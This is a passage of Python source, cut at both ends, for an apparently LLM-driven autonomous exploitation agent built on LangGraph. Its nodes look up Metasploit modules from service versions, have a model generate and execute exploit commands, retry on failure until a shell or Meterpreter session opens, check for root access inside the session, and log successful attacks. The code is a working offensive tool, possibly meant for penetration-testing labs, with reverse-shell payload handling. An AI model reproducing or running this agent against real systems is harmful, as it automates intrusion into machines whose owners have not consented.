    if isinstance(msg, AIMessage) and "[Orchestrator]" in content:
        return True
    if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in content:
        return True
    if isinstance(msg, HumanMessage) and "COMPRESSED HISTORY" in content:
        return True
    return False


def researcher_node(state: AgentState) -> dict:
    """Query knowledge base for exploit information based on target services."""
    target_info = state.get("target_info", {})
    messages = state['messages']

    print_colored("\n[Researcher] Querying knowledge base...", Colors.HEADER)

    # Get the user's original objective
    user_input = ""
    for msg in messages:
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" not in msg.content and "COMPRESSED HISTORY" not in msg.content:
            user_input = msg.content
            break

    # Count how many RAG tool calls already made in this researcher cycle
    researcher_tool_count = 0
    for msg in reversed(messages):
        if _is_cycle_boundary(msg):
            break
        if isinstance(msg, ToolMessage):
            researcher_tool_count += 1

    # Extract failed exploits from prior critic feedback
    failed_modules = _extract_failed_exploits(messages)

    # Build context from target info AND user objective
    context = ""
    if failed_modules:
        banned = '\n'.join(f'  - {m}' for m in failed_modules)
        context += (
            f"BANNED — THESE MODULES ALREADY FAILED. DO NOT RECOMMEND THEM:\n"
            f"{banned}\n"
            f"Focus your queries on DIFFERENT services and exploits.\n\n"
        )

    context += (
        f"USER OBJECTIVE:\n{user_input}\n\n"
        f"TARGET INFO:\n{json.dumps(target_info, indent=2)}\n\n"
    )

    # Deterministic exploit lookup BEFORE RAG
    failed_list = list(failed_modules) if failed_modules else []
    exploit_candidates = match_exploits(target_info, failed_modules=failed_list)
    if exploit_candidates:
        context += "\n**HIGH-CONFIDENCE EXPLOIT MATCHES (from service fingerprints):**\n"
        for i, candidate in enumerate(exploit_candidates, 1):
            context += f"{i}. {candidate['module']} -> port {candidate['matched_port']}/{candidate['matched_service']}\n"
            context += f"   Payload: {candidate['default_payload']}, Confidence: {candidate['confidence']}\n"
            if candidate.get('required_options'):
                context += f"   Required options: {candidate['required_options']}\n"
            context += f"   Notes: {candidate['notes']}\n"
        context += "\nThese are deterministic matches based on exact service versions. Prioritize these over RAG results.\n\n"

    context += f"You have made {researcher_tool_count} knowledge base queries so far."

    # Include any critic feedback if retrying
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
            context += f"\n\nPREVIOUS FAILURE FEEDBACK:\n{msg.content}"
            break

    # Safety valve: force text summary after max queries
    if researcher_tool_count >= MAX_RESEARCHER_TOOL_CALLS:
        print_colored(
            f"[Researcher] Query cap reached ({researcher_tool_count}). Forcing summary.",
            Colors.WARNING
        )
        # Collect all RAG results seen so far
        rag_snippets = []
        for msg in reversed(messages):
            if isinstance(msg, ToolMessage) and msg.content:
                rag_snippets.append(msg.content[:1000])
            if isinstance(msg, AIMessage) and "[Recon Parser]" in (msg.content or ""):
                break

        rag_summary = "\n---\n".join(rag_snippets) if rag_snippets else "No results found."
        banned_reminder = ""
        if failed_modules:
            banned_list = ', '.join(failed_modules)
            banned_reminder = f"\nIMPORTANT: Do NOT include these already-failed modules in your summary: {banned_list}\n"
        force_msg = HumanMessage(content=(
            f"{context}\n\n"
            f"RAG RESULTS SO FAR:\n{rag_summary}\n\n"
            "You have reached the maximum number of knowledge base queries. "
            "Provide a text summary of what you found. If the RAG results were "
            "not relevant, use your GENERAL KNOWLEDGE of Metasploit modules and "
            f"known vulnerabilities for the target services/versions listed above.{banned_reminder}"
        ))
        response = call_llm(
            messages=[force_msg],
            system_prompt=RESEARCHER_PROMPT
        )
        return {"messages": [response]}

    # Normal path: build message window from most recent cycle boundary onwards
    boundary_idx = 0
    for i, msg in enumerate(messages):
        if _is_cycle_boundary(msg):
            boundary_idx = i
    researcher_msgs = list(messages[boundary_idx:])

    # First call: start with context
    if not researcher_msgs or researcher_tool_count == 0:
        researcher_msgs = [HumanMessage(content=context)]
    else:
        # Inject iteration count reminder at the end
        researcher_msgs.append(HumanMessage(content=(
            f"You have made {researcher_tool_count} of {MAX_RESEARCHER_TOOL_CALLS} "
            f"allowed queries. If results are sufficient, provide a text summary now. "
            f"If not relevant, you may query once more OR use general knowledge."
        )))

    response = call_llm(
        messages=researcher_msgs,
        system_prompt=RESEARCHER_PROMPT,
        tools=RESEARCHER_TOOLS
    )
    return {"messages": [response]}


def researcher_tools_node(state: AgentState) -> dict:
    """Execute RAG tool calls from the researcher."""
    tool_node = ToolNode(RESEARCHER_TOOLS)
    result = tool_node.invoke(state)
    return result



def parameter_solver_node(state: AgentState) -> dict:
    """Generate exact MSF command sequence from tool_candidate + target_info + plan."""
    tool_candidate = state.get("tool_candidate", {})
    target_info = state.get("target_info", {})
    current_plan = state.get("current_plan", "")
    messages = state['messages']

    print_colored("\n[Parameter Solver] Configuring exploit parameters...", Colors.HEADER)

    # Include critic feedback if present
    feedback = ""
    for msg in reversed(messages):
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
            feedback = msg.content
            break

    approach = tool_candidate.get("approach", "msf")

    # --- Surface the critic's NEXT_ACTION + a structured failure-category hint ---
    # so the LLM cannot bury/ignore the concrete remediation inside the prose.
    mandate = ""
    structured_hint = ""
    if feedback:
        na = re.search(r'NEXT_ACTION:\s*(.+?)(?:\n|$)', feedback, re.IGNORECASE)
        if na and na.group(1).strip():
            mandate = (
                "MANDATORY INSTRUCTION FROM PREVIOUS FAILURE:\n"
                f"{na.group(1).strip()}\n"
                "You MUST follow this instruction exactly.\n\n"
            )
        fb_lower = feedback.lower()
        if ("wrong_targeturi" in fb_lower or "targeturi" in fb_lower
                or "cookie not found" in fb_lower or "no cookie" in fb_lower):
            structured_hint = (
                "STRUCTURED HINT: failure_category=wrong_targeturi. The previous "
                "TARGETURI was wrong. Try /login, /app, or /rails first. "
                "Do NOT use / again.\n\n"
            )
        elif "not a compatible payload" in fb_lower or "incompatible_payload" in fb_lower:
            structured_hint = (
                "STRUCTURED HINT: failure_category=incompatible_payload. Run "
                "'show payloads' first and select a payload from the listed "
                "compatible ones — do NOT use cmd/unix/reverse_python with this "
                "module unless it appears in the compatible list.\n\n"
            )

    context = mandate + structured_hint + (
        f"ATTACK PLAN:\n{current_plan}\n\n"
        f"TOOL CANDIDATE:\n{json.dumps(tool_candidate, indent=2)}\n\n"
        f"TARGET INFO:\n{json.dumps(target_info, indent=2)}\n\n"
    )
    if feedback:
        context += f"CRITIC FEEDBACK (fix these issues):\n{feedback}\n\n"

    if approach == "manual":
        context += "Generate the exact Linux terminal command sequence for a manual attack (no MSF)."
    else:
        context += "Generate the exact Metasploit command sequence."

    response = call_llm(
        messages=[HumanMessage(content=context)],
        system_prompt=PARAMETER_SOLVER_PROMPT
    )

    commands = response.content
    print_colored(f"[Parameter Solver] Commands:\n{commands[:300]}...", Colors.OKGREEN)

    return {
        "messages": [AIMessage(content=f"[Parameter Solver] Command sequence:\n{commands}")]
    }


def _collect_executor_commands(messages) -> list:
    """Collect tool-call command strings issued since the last [Parameter Solver].

    Returns the list of command strings (the `command` arg of tool_metasploit_rpc /
    tool_linux_terminal calls) in chronological order for the current executor cycle.
    """
    # Find the index of the last [Parameter Solver] marker.
    start_idx = 0
    for i in range(len(messages) - 1, -1, -1):
        m = messages[i]
        if isinstance(m, AIMessage) and "[Parameter Solver]" in (m.content or ""):
            start_idx = i
            break
    cmds = []
    for m in messages[start_idx:]:
        if isinstance(m, AIMessage) and getattr(m, "tool_calls", None):
            for tc in m.tool_calls:
                args = tc.get("args", {}) if isinstance(tc, dict) else {}
                cmd = args.get("command")
                if cmd:
                    cmds.append(str(cmd))
    return cmds


def _count_module_uses(cmds) -> dict:
    """Count `use <module>` occurrences across the given command strings."""
    counts = {}
    for c in cmds:
        m = re.search(r'\buse\s+(\S+)', c)
        if m:
            mod = m.group(1).strip()
            counts[mod] = counts.get(mod, 0) + 1
    return counts


def executor_node(state: AgentState) -> dict:
    """Execute MSF commands one at a time via tool calls. ReAct loop with safety valve."""
    messages = state['messages']

    print_colored("\n[Executor] Running attack sequence...", Colors.HEADER)

    # --- ANTI-REPEAT PRE-CHECK ---
    # If the same module has already been `use`d 2+ times in this executor cycle,
    # the LLM is looping. Force the safety-valve assessment path regardless of
    # the tool-call count so the critic can route to a different exploit.
    prior_cmds = _collect_executor_commands(messages)
    module_use_counts = _count_module_uses(prior_cmds)
    repeated_module = next((mod for mod, n in module_use_counts.items() if n >= 2), None)

    # Count how many tool calls the executor has made in this cycle
    executor_tool_count = 0
    in_executor = False
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and "[Parameter Solver]" in (msg.content or ""):
            break
        if isinstance(msg, ToolMessage):
            executor_tool_count += 1

    # Build the executor's message window: parameter_solver output + executor history
    executor_msgs = []
    capturing = False
    for msg in messages:
        if isinstance(msg, AIMessage) and "[Parameter Solver]" in (msg.content or ""):
            capturing = True
        if capturing:
            executor_msgs.append(msg)

    if not executor_msgs:
        executor_msgs = [messages[-1]]

    # Safety valve: force text response if too many tool calls OR a module is looping
    if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS or repeated_module:
        if repeated_module:
            print_colored(
                f"[Executor] Anti-repeat valve: module '{repeated_module}' already tried "
                f"{module_use_counts[repeated_module]}x this cycle — forcing assessment.",
                Colors.WARNING,
            )
            force_text = (
                f"STOP. You have already run 'use {repeated_module}' "
                f"{module_use_counts[repeated_module]} times this cycle with the same "
                "result. Do NOT make any more tool calls. Provide a text assessment "
                "now: did any session open? What was the exact error? The critic will "
                "route to a DIFFERENT exploit module."
            )
        else:
            print_colored(f"[Executor] Safety valve: {executor_tool_count} tool calls reached, forcing assessment.", Colors.WARNING)
            force_text = "You have used your maximum tool calls. Provide a text assessment of what happened so far. Did any session open? What errors occurred?"
        response = call_llm(
            messages=executor_msgs + [HumanMessage(content=force_text)],
            system_prompt=EXECUTOR_PROMPT
        )
    else:
        response = call_llm(
            messages=executor_msgs,
            system_prompt=EXECUTOR_PROMPT,
            tools=EXECUTOR_TOOLS
        )

    return {"messages": [response]}


def executor_tools_node(state: AgentState) -> dict:
    """Execute MSF/SSH tool calls with LLM-based error recovery hints."""
    # Snapshot the `use <module>` commands already issued BEFORE this batch so we
    # can detect when the executor re-runs a module it has already tried.
    prior_modules = set(_count_module_uses(_collect_executor_commands(state["messages"])).keys())

    # The current AIMessage's tool calls are the about-to-run batch; capture the
    # module(s) it is invoking so we can flag a repeat.
    current_module = None
    last = state["messages"][-1] if state["messages"] else None
    if isinstance(last, AIMessage) and getattr(last, "tool_calls", None):
        for tc in last.tool_calls:
            args = tc.get("args", {}) if isinstance(tc, dict) else {}
            cmd = str(args.get("command", ""))
            mm = re.search(r'\buse\s+(\S+)', cmd)
            if mm:
                current_module = mm.group(1).strip()

    tool_node = ToolNode(EXECUTOR_TOOLS)
    result = tool_node.invoke(state)

    repeat_detected = bool(current_module and current_module in prior_modules)

    if "messages" in result:
        for msg in result["messages"]:
            if isinstance(msg, ToolMessage) and msg.content:
                # --- ANTI-REPEAT: same module already tried this cycle ---
                if repeat_detected:
                    msg.content += (
                        "\n\n[SYSTEM HINT: You have already tried this exact module "
                        f"('{current_module}') with these options. STOP making more tool "
                        "calls and provide a failure text assessment immediately. The "
                        "critic will route to a different exploit.]"
                    )
                # --- SESSION DETECTION: tell executor to STOP ---
                if re.search(r'session \d+ opened', msg.content, re.IGNORECASE):
                    msg.content += (
                        "\n\n*** SESSION OPENED SUCCESSFULLY! ***\n"
                        "STOP making tool calls immediately. Do NOT run any more commands.\n"
                        "Provide your text assessment now: report the session ID, type, and "
                        "that the exploit succeeded."
                    )
                elif any(ind in msg.content for ind in MSF_ERROR_INDICATORS):
                    try:
                        hint_response = call_llm(
                            messages=[HumanMessage(content=f"MSF tool output:\n{msg.content[-1500:]}")],
                            system_prompt=ERROR_ANALYZER_PROMPT,
                            temperature=0
                        )
                        if hint_response.content:
                            msg.content += f"\n\n{hint_response.content.strip()}"
                    except Exception:
                        pass
    return result


def extract_verdict(text: str) -> str:
    """Extract structured verdict from critic LLM response."""
    upper = text.upper()
    # Check for explicit CLASSIFICATION: prefix first (prompt's requested format)
    # FAIL_EXHAUSTED before FAIL_EXPLOIT so the longer/more-specific name wins.
    for verdict in ("FAIL_EXHAUSTED", "FAIL_PARAM", "FAIL_EXPLOIT", "FAIL_CONTEXT", "PASS"):
        if f"CLASSIFICATION: {verdict}" in upper:
            return verdict
    # Fallback: bare keyword anywhere in text
    for verdict in ("FAIL_EXHAUSTED", "FAIL_PARAM", "FAIL_EXPLOIT", "FAIL_CONTEXT"):
        if verdict in upper:
            return verdict
    if "PASS" in upper and "FAIL" not in upper:
        return "PASS"
    # Last resort
    return "FAIL_EXPLOIT"


def critic_node(state: AgentState) -> dict:
    """Evaluate execution result with 4-way classification."""
    messages = state['messages']
    execution_result = state.get("execution_result", "")
    current_step = state.get("loop_step", 0)

    print_colored("\n[Critic] Evaluating execution...", Colors.HEADER)

    # Get the executor's final text assessment. Restrict the fallback scan to
    # messages produced AFTER the most recent [Parameter Solver] marker so we do
    # not pick up the Planner's strategy text or a Researcher summary from an
    # earlier retry cycle (which would make the critic evaluate the plan as if it
    # were execution evidence).
    if not execution_result:
        ps_idx = -1
        for i in range(len(messages) - 1, -1, -1):
            m = messages[i]
            if isinstance(m, AIMessage) and "[Parameter Solver]" in (m.content or ""):
                ps_idx = i
                break
        scan_window = messages[ps_idx + 1:] if ps_idx >= 0 else messages
        for msg in reversed(scan_window):
            if isinstance(msg, AIMessage) and not msg.tool_calls and msg.content:
                execution_result = msg.content
                break

    # Check for context bloat
    total_chars = sum(len(m.content) if m.content else 0 for m in messages)

    # Build evidence block
    tool_outputs = []
    for msg in messages[-10:]:
        if isinstance(msg, ToolMessage):
            tool_outputs.append(msg.content[-800:] if len(msg.content) > 800 else msg.content)

    # Scan ALL tool outputs since parameter solver for session-opened indicators
    session_detected = False
    for msg in reversed(messages):
        if isinstance(msg, AIMessage) and "[Parameter Solver]" in (msg.content or ""):
            break
        if isinstance(msg, ToolMessage) and msg.content:
            if re.search(r"session \d+ opened", msg.content, re.IGNORECASE):
                session_detected = True
                break

    evidence = (
        f"EXECUTION RESULT:\n{execution_result}\n\n"
        f"SESSION DETECTED: {session_detected}\n\n"
        f"RECENT TOOL OUTPUTS:\n{'---'.join(tool_outputs)}\n\n"
        f"USER GOAL: {messages[0].content[:500]}\n\n"
        f"LOOP STEP: {current_step} of {MAX_RETRIES}\n"
        f"TOTAL CONTEXT SIZE: {total_chars} chars\n"
    )

    # Compress individual large tool messages before sending to critic
    # (instead of auto-triggering FAIL_CONTEXT which provides no useful guidance)
    if total_chars > TOKEN_SENSITIVE_THRESHOLD:
        print_colored(f"[Critic] Large context ({total_chars} chars) — trimming evidence for critic.", Colors.WARNING)
        # Trim tool outputs to keep evidence manageable
        tool_outputs = [t[-400:] for t in tool_outputs]
        evidence = (
            f"EXECUTION RESULT:\n{execution_result}\n\n"
            f"SESSION DETECTED: {session_detected}\n\n"
            f"RECENT TOOL OUTPUTS (trimmed):\n{'---'.join(tool_outputs)}\n\n"
            f"USER GOAL: {messages[0].content[:500]}\n\n"
            f"LOOP STEP: {current_step} of {MAX_RETRIES}\n"
            f"TOTAL CONTEXT SIZE: {total_chars} chars (large — consider FAIL_CONTEXT if agent is looping)\n"
        )

    response = call_llm(
        messages=[HumanMessage(content=evidence)],
        system_prompt=CRITIC_PROMPT
    )
    classification = response.content.strip()

    print_colored(f"[Critic] Verdict: {classification}", Colors.OKCYAN)

    new_step = current_step + 1

    # Extract structured verdict and set in state for routing
    verdict = extract_verdict(classification)
    print_colored(f"[Critic] Classified as: {verdict}", Colors.OKCYAN)

    if verdict == "PASS":
        return {
            "messages": [AIMessage(content=f"[Critic] PASS — {classification}")],
            "execution_result": execution_result,
            "loop_step": new_step,
            "critic_verdict": "PASS"
        }
    else:
        return {
            "messages": [HumanMessage(content=f"CRITIC FEEDBACK: {classification}")],
            "execution_result": execution_result,
            "loop_step": new_step,
            "critic_verdict": verdict
        }


def success_logger_node(state: AgentState) -> dict:
    """Log successful attack details to the dedicated RAG database."""
    from datetime import datetime
    from tools.rag import log_successful_attack

    target_info = state.get("target_info", {})
    tool_candidate = state.get("tool_candidate", {})
    current_plan = state.get("current_plan", "")
    execution_result = state.get("execution_result", "")

    target_ip = target_info.get("ip", "unknown")
    target_os = target_info.get("os", "unknown")

    # Match attacked service from plan text against target_info ports
    ports = target_info.get("ports", [])
    attacked_port, attacked_service, attacked_version = "", "", ""
    for p in ports:
        svc = p.get("service", "")
        if svc and svc.lower() in current_plan.lower():
            attacked_port = str(p.get("port", ""))
            attacked_service = svc
            attacked_version = p.get("version", "")
            break
    if not attacked_service and ports:  # fallback: first port
        attacked_port = str(ports[0].get("port", ""))
        attacked_service = ports[0].get("service", "")
        attacked_version = ports[0].get("version", "")

    module = tool_candidate.get("module", "unknown")
    description = tool_candidate.get("description", "")

    session_match = re.search(
        r"((?:Command shell|Meterpreter) session \d+ opened)", execution_result
    )
    outcome = session_match.group(1) if session_match else "Session opened"

    log_entry = (
        f"SUCCESSFUL ATTACK LOG\n"
        f"=====================\n"
        f"Target: {target_ip}\n"
        f"OS: {target_os}\n"
        f"Service: {attacked_service}\n"
        f"Version: {attacked_version}\n"
        f"Port: {attacked_port}\n\n"
        f"MSF Module: {module}\n"
        f"Description: {description}\n\n"
        f"Attack Plan: {current_plan}\n\n"
        f"Outcome: {outcome}\n"
        f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
    )

    print_colored(f"\n[Success Logger] Logging to successful_attacks DB...", Colors.OKGREEN)
    result = log_successful_attack(
        content=log_entry,
        metadata={"target_ip": target_ip, "target_os": target_os,
                  "service": attacked_service, "version": attacked_version,
                  "module": module}
    )
    print_colored(f"[Success Logger] {result}", Colors.OKGREEN)

    return {"messages": [AIMessage(content=f"[Success Logger] Attack logged. {outcome}")]}


def _extract_findings(state: dict) -> ExploitationFindings:
    """Extract structured ExploitationFindings from final graph state."""
    target_info = state.get("target_info", {})
    tool_candidate = state.get("tool_candidate", {})
    current_plan = state.get("current_plan", "")
    execution_result = state.get("execution_result", "")
    critic_verdict = state.get("critic_verdict", "")
    messages = state.get("messages", [])

    # --- session_id and session_type from message history ---
    session_id = ""
    session_type = ""
    # Scan all messages (tool outputs) for session-opened indicators
    for msg in reversed(messages):
        content = msg.content if hasattr(msg, "content") and msg.content else ""
        match = re.search(
            r"(Command shell|Meterpreter) session (\d+) opened", content
        )
        if match:
            raw_type = match.group(1)
            session_id = match.group(2)
            session_type = "meterpreter" if "Meterpreter" in raw_type else "command_shell"
            break

    # Success requires BOTH a PASS verdict AND a real session. A PASS with no
    # session (should no longer happen now that FAIL_EXHAUSTED exists, but
    # defend anyway) must NOT be reported as success.
    success = (critic_verdict == "PASS") and bool(session_id)

    # --- target_ip ---
    target_ip = target_info.get("ip", "unknown")

    # --- target_port: match service name from plan against target_info ports ---
    ports = target_info.get("ports", [])
    target_port = ""
    for p in ports:
        svc = p.get("service", "")
        if svc and svc.lower() in current_plan.lower():
            target_port = str(p.get("port", ""))
            break
    if not target_port and ports:
        target_port = str(ports[0].get("port", ""))

    # --- exploit_used ---
    approach = tool_candidate.get("approach", "msf")
    module = tool_candidate.get("module")
    if approach == "manual":
        desc = tool_candidate.get("description", "manual exploitation")
        exploit_used = f"manual:{desc}"
    elif module:
        exploit_used = module
    else:
        exploit_used = "unknown"

    # --- access_level: determine by actually running whoami on the session ---
    access_level = "unknown"
    result_lower = (execution_result or "").lower()

    # Check execution output for root evidence first
    if "root" in result_lower or "uid=0" in result_lower:
        access_level = "root"
    elif session_id:
        # Run `id` INSIDE the session via the RPC session API. The previous
        # implementation used `sessions <id>` (no -i) on the MSF console, which
        # only prints session info and leaves `whoami` running in the Kali
        # console context — returning the attacker identity, not the target's.
        try:
            id_out = str(
                msf_session.run_session_command(session_id, "id")
            ).strip().lower()
            print_colored(f"[Access Check] id on session {session_id}: {id_out}", Colors.OKCYAN)
            if "root" in id_out or "uid=0" in id_out:
                access_level = "root"
            else:
                access_level = "user"
        except Exception as e:
            print_colored(f"[Access Check] Failed to check id on session: {e}", Colors.WARNING)
            access_level = "user"  # Conservative default

    # --- summary ---
    if success and session_id:
        summary = f"{session_type} session {session_id} opened on {target_ip}:{target_port} via {exploit_used}"
    elif success:
        summary = f"Attack succeeded on {target_ip} via {exploit_used}"
    else:
        # Pull last critic feedback for failure context
        fail_summary = ""
        for msg in reversed(messages):
            content = msg.content if hasattr(msg, "content") and msg.content else ""
            if "CRITIC FEEDBACK" in content:
                fail_summary = content[:200]
                break
        summary = f"Attack failed on {target_ip}. {fail_summary}".strip()

    # --- failure classification + session identity (for replanner) ---
    session_user_info = _extract_session_user_info(messages)
    # Raw command shells (ProFTPD mod_copy, Samba) often produce no `uid=` line
    # in any ToolMessage — the executor never ran `id`. If we have a confirmed
    # session but no identity, query it directly via the session API. Wrapped so
    # it can never block the return of findings.
    if success and session_id and not session_user_info:
        try:
            id_out = str(msf_session.run_session_command(session_id, "id"))
            m = re.search(r'uid=(\d+)\((\w+)\)', id_out)
            if m:
                session_user_info = {
                    "uid": m.group(1), "user": m.group(2), "raw": m.group(0),
                }
                print_colored(
                    f"[Session Identity] Recovered {m.group(0)} from session {session_id}",
                    Colors.OKCYAN,
                )
        except Exception as e:
            print_colored(f"[Session Identity] Could not query session {session_id}: {e}", Colors.WARNING)
    if success:
        failure_category = ""
        failure_cause = ""
    else:
        failure_category, failure_cause = _classify_failure_from_messages(messages)

    return ExploitationFindings(
        success=success,
        session_id=session_id,
        session_type=session_type,
        target_ip=target_ip,
        target_port=target_port,
        exploit_used=exploit_used,
        access_level=access_level,
        summary=summary,
        failure_category=failure_category,
        failure_cause=failure_cause,
        session_user_info=session_user_info,
    )


def summarizer_node(state: AgentState) -> dict:
    """Compress message history while preserving key technical details."""
    messages = state['messages']

    print_colored("\n[Summarizer] Compressing context...", Colors.HEADER)

    # Keep original user message
    original_msg = messages[0]

    # Keep last 2 turns (approximate: last 6 messages)
    tail_count = min(6, len(messages) - 1)
    tail = messages[-tail_count:] if tail_count > 0 else []

    # Summarize everything in between
    middle = messages[1:-tail_count] if tail_count > 0 else messages[1:]

    if middle:
        summary = summarize_history(middle)
        summary_msg = HumanMessage(content=f"[COMPRESSED HISTORY]\n{summary}")
        new_messages = [original_msg, summary_msg] + tail
    else:
        new_messages = [original_msg] + tail

    # Also compress any individually large messages in the tail
    final_messages = []
    for msg in new_messages:
        if msg.content and len(msg.content) > HEAVY_MESSAGE_THRESHOLD:
            final_messages.append(compress_large_message(msg))
        else:
            final_messages.append(msg)

    print_colored(f"[Summarizer] Compressed {len(messages)} messages → {len(final_messages)} messages", Colors.OKGREEN)

    # We need to REPLACE the entire message list, not append.
    # LangGraph uses operator.add for messages, so we clear by returning the diff.
    # Workaround: return the summarized content as a single new message since we can't
    # replace the full list via operator.add. The summarizer injects compressed context.
    summary_text = summarize_history(messages[1:])
    return {
        "messages": [HumanMessage(content=f"[COMPRESSED HISTORY — Previous attempts summarized]\n{summary_text}\n\nRetry with a completely different approach.")]
    }

# =============================================================================
# ROUTING FUNCTIONS
# =============================================================================

def route_after_researcher(state: AgentState) -> Literal["researcher_tools", "planner"]:
    """Route researcher output: tool call → tools node, text → planner."""
    last_msg = state['messages'][-1]

    if hasattr(last_msg, 'tool_calls') and last_msg.tool_calls:
        # Count researcher tool calls as extra safety
        count = 0
        for msg in reversed(state['messages']):
            if _is_cycle_boundary(msg):
                break
            if isinstance(msg, ToolMessage):
                count += 1
        if count >= MAX_RESEARCHER_TOOL_CALLS:
            return "planner"  # Force exit loop
        return "researcher_tools"
    return "planner"


def route_after_executor(state: AgentState) -> Literal["executor_tools", "critic"]:
    """Route executor output: tool call → tools node, text → critic."""
    last_msg = state['messages'][-1]

    # --- Session detection shortcut: if any tool output shows session opened, go to critic ---
    for msg in reversed(state['messages']):
        if isinstance(msg, AIMessage) and "[Parameter Solver]" in (msg.content or ""):
            break
        if isinstance(msg, ToolMessage) and msg.content:
            if re.search(r'session \d+ opened', msg.content, re.IGNORECASE):
                print_colored("[Executor] SESSION DETECTED in tool output — routing to critic.", Colors.OKGREEN)
                return "critic"

    if hasattr(last_msg, 'tool_calls') and last_msg.tool_calls:
        # Check safety valve
        executor_tool_count = 0
        for msg in reversed(state['messages']):
            if isinstance(msg, AIMessage) and "[Parameter Solver]" in (msg.content or ""):
                break
            if isinstance(msg, ToolMessage):
                executor_tool_count += 1

        if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS:
            return "critic"

        return "executor_tools"
    return "critic"


def route_after_critic(state: AgentState) -> Literal["parameter_solver", "researcher", "summarizer", "success_logger", "__end__"]:
    """Route based on critic's structured verdict in state."""
    time.sleep(3)  # Rate limiting

    current_step = state.get("loop_step", 0)
    if current_step >= MAX_RETRIES:
        print_colored("--- MAX RETRIES REACHED ---", Colors.FAIL)
        return END

    verdict = state.get("critic_verdict", "FAIL_EXPLOIT")

    if verdict == "PASS":
        return "success_logger"
    elif verdict == "FAIL_EXHAUSTED":
        # Gave up after exhausting alternatives — no session. Exit with failure
        # findings (same as max-retries exit). Do NOT mark the node successful.
        print_colored("--- CRITIC: FAIL_EXHAUSTED (unfixable, no session) — ending ---", Colors.FAIL)
        return END
    elif verdict == "FAIL_PARAM":
        return "parameter_solver"
    elif verdict == "FAIL_EXPLOIT":
        return "researcher"
    elif verdict == "FAIL_CONTEXT":
        return "summarizer"
    else:
        return "researcher"  # Safe default

# =============================================================================
# GRAPH CONSTRUCTION
# =============================================================================

def build_graph() -> StateGraph:
    """Construct the multi-node agent workflow graph."""
    workflow = StateGraph(AgentState)

    # Add nodes (no researcher_filter)
    workflow.add_node("recon_parser", recon_parser_node)
    workflow.add_node("researcher", researcher_node)
    workflow.add_node("researcher_tools", researcher_tools_node, retry=RetryPolicy(max_attempts=2))
    workflow.add_node("planner", planner_node)
    workflow.add_node("parameter_solver", parameter_solver_node)
    workflow.add_node("executor", executor_node)
    workflow.add_node("executor_tools", executor_tools_node, retry=RetryPolicy(max_attempts=2))
    workflow.add_node("critic", critic_node)
    workflow.add_node("success_logger", success_logger_node)
    workflow.add_node("summarizer", summarizer_node)

    # Entry point
    workflow.set_entry_point("recon_parser")

    # Linear: recon → researcher
    workflow.add_edge("recon_parser", "researcher")

    # Researcher ReAct loop → planner
    workflow.add_conditional_edges(
        "researcher",
        route_after_researcher,
        {"researcher_tools": "researcher_tools", "planner": "planner"}
    )
    workflow.add_edge("researcher_tools", "researcher")

    # Planner → parameter_solver
    workflow.add_edge("planner", "parameter_solver")

    # Parameter solver → executor
    workflow.add_edge("parameter_solver", "executor")

    # Executor ReAct loop
    workflow.add_conditional_edges(
        "executor",
        route_after_executor,
        {"executor_tools": "executor_tools", "critic": "critic"}
    )
    workflow.add_edge("executor_tools", "executor")

    # Critic routing (FAIL_EXPLOIT → researcher instead of planner)
    workflow.add_conditional_edges(
        "critic",
        route_after_critic,
        {
            "parameter_solver": "parameter_solver",
            "researcher": "researcher",
            "summarizer": "summarizer",
            "success_logger": "success_logger",
            END: END
        }
    )

    # Success logger → END
    workflow.add_edge("success_logger", END)

    # Summarizer → researcher (was: planner)
    workflow.add_edge("summarizer", "researcher")

    return workflow

# =============================================================================
# SUBGRAPH WRAPPER
# =============================================================================

def run_exploitation(
    target_info: dict,
    objective: str,
    raw_recon: str = "",
    thread_id: str = None,
    recursion_limit: int = 150,
) -> ExploitationFindings:
    """Run the exploitation graph as a callable subgraph and return structured findings.

    Args:
        target_info: Dict with keys {ip, os, hostname, ports: [{port, state, service, version}]}
        objective: Attack objective string (e.g., "get a reverse shell on the target")
        raw_recon: Optional raw nmap/recon output. If empty, recon_parser_node will
                   skip parsing and preserve the pre-injected target_info.
        thread_id: Optional thread ID for checkpointing. Defaults to a timestamped ID.
        recursion_limit: Max LangGraph recursion steps (default 150).

    Returns:
        ExploitationFindings dict with success, session_id, session_type, etc.
    """
    import uuid

    if thread_id is None:
        thread_id = f"exploit_{uuid.uuid4().hex[:8]}"

    workflow = build_graph()
    checkpointer = MemorySaver()
    app = workflow.compile(checkpointer=checkpointer)

    config = {
        "configurable": {"thread_id": thread_id},
        "recursion_limit": recursion_limit,
    }

    initial_state = {
        "messages": [HumanMessage(content=objective)],
        "raw_recon": raw_recon,
        "target_info": target_info,
        "current_plan": "",
        "tool_candidate": {},
        "execution_result": "",
        "loop_step": 0,
        "critic_verdict": "",
    }

    print_colored(f"\n{'='*60}", Colors.HEADER)
    print_colored(f"[run_exploitation] Starting exploitation subgraph", Colors.HEADER)
    print_colored(f"  Target: {target_info.get('ip', 'unknown')}", Colors.HEADER)
    print_colored(f"  Objective: {objective[:100]}", Colors.HEADER)
    print_colored(f"  Thread: {thread_id}", Colors.HEADER)
    print_colored(f"{'='*60}\n", Colors.HEADER)

    # Stream to completion, printing progress
    for event in app.stream(initial_state, config=config):
        for key, value in event.items():
            if not value or "messages" not in value:
                continue
            messages = value["messages"]
            if not isinstance(messages, list):
                messages = [messages]
            for msg in messages:
                if not isinstance(msg, BaseMessage) or not msg.content:
                    continue
                if "CRITIC FEEDBACK" in msg.content:
                    print_colored(f"\n{msg.content}", Colors.FAIL)
                elif "COMPRESSED HISTORY" in msg.content:
                    print_colored("\n[System] Context compressed for fresh retry.", Colors.OKCYAN)
                elif isinstance(msg, ToolMessage):
                    display = msg.content[:500]
                    if len(msg.content) > 500:
                        display += "... [truncated]"
                    print(f"\n[Tool Output]: {display}")
                elif isinstance(msg, AIMessage):
                    content = msg.content
                    if content.startswith("[Recon Parser]"):
                        print_colored(f"\n{content}", Colors.HEADER)
                    elif content.startswith("[Planner]"):
                        print_colored(f"\n{content}", Colors.OKBLUE)
                    elif content.startswith("[Parameter Solver]"):
                        print_colored(f"\n{content}", Colors.WARNING)
